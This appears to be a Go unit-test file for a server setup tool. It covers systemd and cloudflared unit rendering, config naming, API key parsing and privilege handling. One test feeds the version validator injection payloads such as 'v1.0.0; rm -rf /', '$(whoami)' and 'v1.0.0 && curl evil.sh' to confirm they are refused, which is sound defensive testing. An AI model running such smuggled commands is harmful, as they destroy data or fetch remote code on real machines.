package setuptool

import (
	"bytes"
	"path/filepath"
	"strings"
	"testing"
	"text/template"

	"github.com/vutran1710/claudebox/internal/boxconfig"
)

// The unit is the part that fails silently on a real box: systemd accepts a
// file it does not understand by refusing to start, long after this tool has
// reported success.

func renderUnit(t *testing.T, addr, user, home string) string {
	t.Helper()
	tmpl, err := template.New("unit").Parse(unitTemplate)
	if err != nil {
		t.Fatalf("the embedded unit does not parse: %v", err)
	}
	var b bytes.Buffer
	if err := tmpl.Execute(&b, struct{ Addr, User, Home string }{addr, user, home}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	return b.String()
}

func TestTheUnitSubstitutesEveryPlaceholder(t *testing.T) {
	got := renderUnit(t, "127.0.0.1:8091", "root", "/root")
	if strings.Contains(got, "{{") {
		t.Errorf("a placeholder survived rendering:\n%s", got)
	}
	for _, want := range []string{"127.0.0.1:8091", "User=root", "HOME=/root"} {
		if !strings.Contains(got, want) {
			t.Errorf("unit is missing %q:\n%s", want, got)
		}
	}
}

func TestTheUnitKillsQueryChildrenWithTheService(t *testing.T) {
	got := renderUnit(t, DefaultAPIAddr, "root", "/root")
	// Without this a restart orphans a claude -p that keeps writing to a
	// transcript nothing tracks, while the restarted server believes that
	// session is free and starts a second one on the same conversation.
	if !strings.Contains(got, "KillMode=control-group") {
		t.Errorf("unit does not kill children with the service:\n%s", got)
	}
}

func TestTheUnitRestartsAndStartsOnBoot(t *testing.T) {
	got := renderUnit(t, DefaultAPIAddr, "root", "/root")
	// These are the whole reason a supervisor is preferred over --detach.
	for _, want := range []string{"Restart=on-failure", "WantedBy=multi-user.target"} {
		if !strings.Contains(got, want) {
			t.Errorf("unit is missing %q:\n%s", want, got)
		}
	}
}

func TestTheUnitRunsServeInTheForeground(t *testing.T) {
	got := renderUnit(t, DefaultAPIAddr, "root", "/root")
	if !strings.Contains(got, "Type=simple") {
		t.Error("unit is not Type=simple")
	}
	// A forking server under Type=simple would be reaped as soon as the
	// parent exited.
	if strings.Contains(got, "--detach") {
		t.Error("the unit passes --detach — systemd is already doing the backgrounding")
	}
}

func TestTheUnitBindsLoopbackByDefault(t *testing.T) {
	got := renderUnit(t, DefaultAPIAddr, "root", "/root")
	if !strings.Contains(got, "127.0.0.1") {
		t.Errorf("the default unit does not bind loopback:\n%s", got)
	}
}

func TestParseFactReadsCbxOutput(t *testing.T) {
	out := "addr\thttp://127.0.0.1:8091\nkey\tcbx_live_abc\npid\t42\n"
	got, err := parseFact(out, "key")
	if err != nil {
		t.Fatal(err)
	}
	if got != "cbx_live_abc" {
		t.Errorf("key = %q", got)
	}
	if _, err := parseFact(out, "absent"); err == nil {
		t.Error("a missing fact was not an error")
	}
}

func TestForwardCommandTargetsThePortTheAPIBinds(t *testing.T) {
	target, err := NewTarget("203.0.113.9", "root")
	if err != nil {
		t.Fatal(err)
	}
	got := ForwardCommand(target, "127.0.0.1:8091")
	for _, want := range []string{"-L 8091:localhost:8091", "root@203.0.113.9"} {
		if !strings.Contains(got, want) {
			t.Errorf("%q is missing %q", got, want)
		}
	}
}

func TestTheShippedSpecIsWhatGetsUploaded(t *testing.T) {
	// UploadCommandSpec sends boxconfig.Default(), which is cbx.example.yaml
	// at the project root. If that stopped parsing, a box would get a config
	// its own server refuses to load.
	cfg, err := boxconfig.Parse(boxconfig.Default())
	if err != nil {
		t.Fatalf("the config shipped to boxes does not parse: %v", err)
	}
	// It carries both sections, which is why the file is no longer named for
	// one of them.
	if len(cfg.Roles) == 0 || len(cfg.Commands) == 0 {
		t.Fatalf("the shipped config is missing a section: %d roles, %d commands", len(cfg.Roles), len(cfg.Commands))
	}
}

// The filename follows the rename. A box given commands.yaml keeps working
// through the server's legacy fallback, but the first PUT /commands writes a
// cbx.yaml beside it and the uploaded file goes quietly dead.
func TestTheSpecIsUploadedUnderTheCurrentName(t *testing.T) {
	if got := ConfigPath("/home/box"); got != "/home/box/.config/cbx/cbx.yaml" {
		t.Errorf("ConfigPath() = %q", got)
	}
	// And the pre-roles name is still known, because a box holding it must be
	// left alone rather than given a second config.
	if LegacyConfigPath("/home/box") == ConfigPath("/home/box") {
		t.Error("the legacy path is not distinguishable, so an older box cannot be detected")
	}
}

// --- tunnel ---

func renderTunnel(t *testing.T, addr string) string {
	t.Helper()
	tmpl, err := template.New("tunnel").Parse(tunnelUnitTemplate)
	if err != nil {
		t.Fatalf("the embedded tunnel unit does not parse: %v", err)
	}
	var b bytes.Buffer
	if err := tmpl.Execute(&b, struct{ Addr string }{addr}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	return b.String()
}

func TestTheTunnelUnitPointsAtTheAPI(t *testing.T) {
	got := renderTunnel(t, DefaultAPIAddr)
	if strings.Contains(got, "{{") {
		t.Errorf("a placeholder survived rendering:\n%s", got)
	}
	if !strings.Contains(got, "--url http://"+DefaultAPIAddr) {
		t.Errorf("unit does not point at the API:\n%s", got)
	}
}

func TestTheTunnelWaitsForTheAPI(t *testing.T) {
	got := renderTunnel(t, DefaultAPIAddr)
	// A tunnel to a server that is not up yet resolves to a 502 for whoever
	// opens the URL first.
	if !strings.Contains(got, "Requires=cbx-api.service") {
		t.Errorf("unit does not require the API service:\n%s", got)
	}
}

// Real cloudflared output. A simplified fixture would pass while being wrong
// about the shape, which is how the settings.json portability pass first
// shipped broken.
const cloudflaredLog = `Jan 02 15:04:05 box cloudflared[123]: 2026-01-02T15:04:05Z INF Requesting new quick Tunnel on trycloudflare.com...
Jan 02 15:04:07 box cloudflared[123]: 2026-01-02T15:04:07Z INF +----------------------------------------------------------+
Jan 02 15:04:07 box cloudflared[123]: 2026-01-02T15:04:07Z INF |  Your quick Tunnel has been created! Visit it at         |
Jan 02 15:04:07 box cloudflared[123]: 2026-01-02T15:04:07Z INF |  https://calm-river-fox-1234.trycloudflare.com           |
Jan 02 15:04:07 box cloudflared[123]: 2026-01-02T15:04:07Z INF +----------------------------------------------------------+`

func TestFindTunnelURLReadsCloudflaredOutput(t *testing.T) {
	if got := FindTunnelURL(cloudflaredLog); got != "https://calm-river-fox-1234.trycloudflare.com" {
		t.Errorf("FindTunnelURL = %q", got)
	}
}

func TestFindTunnelURLTakesTheMostRecent(t *testing.T) {
	// A restarted tunnel leaves the previous hostname in the journal, and that
	// one no longer resolves.
	two := cloudflaredLog + "\nJan 02 16:00:00 box cloudflared[999]: INF |  https://new-hostname-5678.trycloudflare.com  |"
	if got := FindTunnelURL(two); got != "https://new-hostname-5678.trycloudflare.com" {
		t.Errorf("FindTunnelURL = %q, want the most recent", got)
	}
}

func TestFindTunnelURLIsEmptyWhenThereIsNone(t *testing.T) {
	if got := FindTunnelURL("INF Requesting new quick Tunnel...\nINF connecting"); got != "" {
		t.Errorf("FindTunnelURL = %q, want empty", got)
	}
}

func TestCloudflaredIsCheckableAndNotInstalledByDefault(t *testing.T) {
	s := CloudflaredStep()
	if s.Check == nil || s.Do == nil {
		t.Fatal("the cloudflared step is missing Check or Do")
	}
	// Exposing a box is meant to be a decision, so cloudflared is not put on
	// every box that runs setup.
	for _, installed := range InstallSteps() {
		if installed.Name == s.Name {
			t.Error("cloudflared is in the default install steps — exposure should be explicit")
		}
	}
}

// --- fetching a released cbx ---

// The version reaches a URL built inside a remote shell. Quoting defends the
// shell and does nothing about a value that is not a tag, which is the same
// distinction that produced a command injection through git clone.
func TestFetchCBXRejectsAVersionThatIsNotATag(t *testing.T) {
	for _, bad := range []string{
		"v1.0.0; rm -rf /",
		"$(whoami)",
		"../../../etc/passwd",
		"-v1.0.0",
		"v1.0.0 && curl evil.sh",
		"`id`",
	} {
		if _, err := FetchCBX(Target{User: "root", Host: "203.0.113.9"}, bad); err == nil {
			t.Errorf("version %q was accepted", bad)
		} else if !strings.Contains(err.Error(), "invalid version") {
			// It must be refused before any ssh is attempted, not after a
			// connection timeout against a box that was never the problem.
			t.Errorf("version %q failed for the wrong reason: %v", bad, err)
		}
	}
}

func TestFetchCBXAcceptsRealTags(t *testing.T) {
	for _, ok := range []string{"v0.8.0", "0.8.0", "v1.2.3-rc1"} {
		if !releaseTag.MatchString(ok) {
			t.Errorf("tag %q rejected", ok)
		}
	}
}

func TestLastLineIsWhatTheBinaryReported(t *testing.T) {
	// FetchCBX ends its script with `cbx --version`, so the installed version
	// is the last line — what is printed is what is on the box, rather than
	// what was asked for.
	if got := lastLine("downloading...\ninstalling\ncbx version 0.9.0\n"); got != "cbx version 0.9.0" {
		t.Errorf("lastLine = %q", got)
	}
}

// A box with no keys is the ordinary state of one being set up, not a
// failure. Refusing here made `setup --with-api` fail on exactly the machine
// it was meant to prepare.
func TestABoxWithNoKeysIsNotAFailure(t *testing.T) {
	cases := []struct {
		name, listing, want string
		found               bool
	}{
		{"a populated listing", "backend\tcbx_live_abc\treporter\t2026-09-24\n", "cbx_live_abc", true},
		{"several keys, the first usable one", "a\tcbx_live_one\nb\tcbx_live_two\n", "cbx_live_one", true},
		{"a box with none", "", "", false},
		{"headers but no rows", "label\tvalue\trole\n", "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, ok := firstKey(c.listing)
			if ok != c.found || got != c.want {
				t.Errorf("firstKey() = %q, %v; want %q, %v", got, ok, c.want, c.found)
			}
		})
	}
}

// The uploader writes the config and setup prints where it went. Two literals
// drifted once — written as cbx.yaml, reported as the pre-roles commands.yaml
// — which is a tool lying about what it just did.
func TestTheUploadedConfigIsNamedWhatSetupPrints(t *testing.T) {
	if ConfigName != filepath.Base(boxconfig.DefaultPath()) {
		t.Errorf("ConfigName = %q but the server reads %q", ConfigName, boxconfig.DefaultPath())
	}
}

// Least privilege that still works: a session can write its own output and
// nothing that shapes the box. An unrestricted default would make the role
// system opt-in.
func TestTheFirstKeyIsIssuedAgainstARestrictedRole(t *testing.T) {
	if DefaultRole == "" {
		t.Fatal("a key issued during setup would carry no role, and an empty role is refused")
	}
	cfg, err := boxconfig.Parse(boxconfig.Default())
	if err != nil {
		t.Fatal(err)
	}
	role, err := cfg.Role(DefaultRole)
	if err != nil {
		t.Fatalf("the shipped config does not define %q: %v", DefaultRole, err)
	}
	if len(role.Deny) == 0 {
		t.Errorf("%q denies nothing, so setup would hand out an unrestricted key", DefaultRole)
	}
}

// `api-key add` reports the whole record — label, role, value. Returning it
// whole printed three tab-separated lines into a field sized for one.
func TestIssuingAKeyReturnsTheKeyNotTheRecord(t *testing.T) {
	record := "label\tsetup\nrole\treporter\nkey\tcbx_live_abc123\n"
	got, ok := firstKey(record)
	if !ok {
		t.Fatal("the issued key could not be read back out of its own record")
	}
	if got != "cbx_live_abc123" {
		t.Errorf("got %q, want just the key", got)
	}
	if strings.Contains(got, "\n") || strings.Contains(got, "\t") {
		t.Errorf("the value still carries the rest of the record: %q", got)
	}
}

// The tunnel's journal is readable by root. A user outside adm and
// systemd-journal — the ordinary case — gets "No entries" rather than an
// error, so an unprivileged read is indistinguishable from a tunnel that has
// not started, and waits out the whole timeout while the URL sits in the log.
func TestTheTunnelLogIsReadAsRoot(t *testing.T) {
	tg, err := NewTarget("box", "deploy")
	if err != nil {
		t.Fatal(err)
	}
	if got := tg.privileged(tunnelLogScript); !strings.HasPrefix(got, "sudo -n ") {
		t.Errorf("the journal read is not escalated: %s", got)
	}
	// And unchanged for a root box, which never needed it.
	root, err := NewTarget("box", "root")
	if err != nil {
		t.Fatal(err)
	}
	if got := root.privileged(tunnelLogScript); got != tunnelLogScript {
		t.Errorf("a root target should read the journal directly: %s", got)
	}
}

// `|| true` turns a permission failure into a successful empty read, which is
// how a tunnel that was working got reported as one that never started.
func TestTheTunnelLogReadDoesNotSwallowItsError(t *testing.T) {
	if strings.Contains(tunnelLogScript, "|| true") {
		t.Error("the read swallows failures, so 'cannot read' is reported as 'nothing found'")
	}
	if strings.Contains(tunnelLogScript, "2>/dev/null") {
		t.Error("the read discards stderr, hiding why it found nothing")
	}
}
